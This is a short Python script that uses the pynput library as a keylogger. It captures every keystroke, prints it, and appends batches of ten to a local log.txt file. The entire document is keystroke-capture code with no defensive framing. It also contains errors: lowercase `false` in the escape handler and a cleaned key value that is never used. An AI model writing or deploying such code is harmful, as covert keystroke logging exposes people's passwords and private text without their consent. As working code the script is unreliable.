import pynput
from pynput.keyboard import Key,Listener

c = 0
keys = []

def on_press(key):

    global c,keys

    print("{} pressed".format(key))#print pressed key on press
    keys.append(key)
    c+=1

    if c >= 10:
        c = 0
        write_file(keys)
        keys.clear()

def on_release(key):
    if key == Key.esc:
        return false #break the loop if we press the escape key

def write_file(keys):
    with open("log.txt","a") as files:
        for key in keys:
            k = str(key).replace("'","")
            files.write(str(key))


with Listener(on_press = on_press , on_release = on_release) as listener:
    listener.join()#the loop that is listening


